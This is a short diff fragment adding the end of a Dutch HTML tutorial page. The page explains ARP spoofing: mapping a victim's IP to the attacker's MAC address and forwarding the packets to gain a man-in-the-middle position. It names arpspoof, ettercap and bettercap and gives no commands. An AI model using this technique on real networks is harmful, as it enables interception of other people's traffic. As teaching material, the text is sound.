+<p>192.168.1.3 is te vinden op EVILMAC1</p>
+<p>192.168.1.3 is te vinden op EVILMAC1</p>
+</blockquote>
+<p>naar het MAC adres van computer A. Op onze eigen computer zorgen wij ervoor dat wij de binnengekomen pakketten ook opnieuw verzenden naar de goede computer zodat het netwerk blijft draaien, en je hebt een Man in the Middle positie bemachtigd.</p>
+<p>Tooling: Arpspoof, ettercap, bettercap </p>
+<h1>Dankwoord</h1>
+<p>Github bedankt voor het hosten :)</p>
+
+</body>
+</html>
+<!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
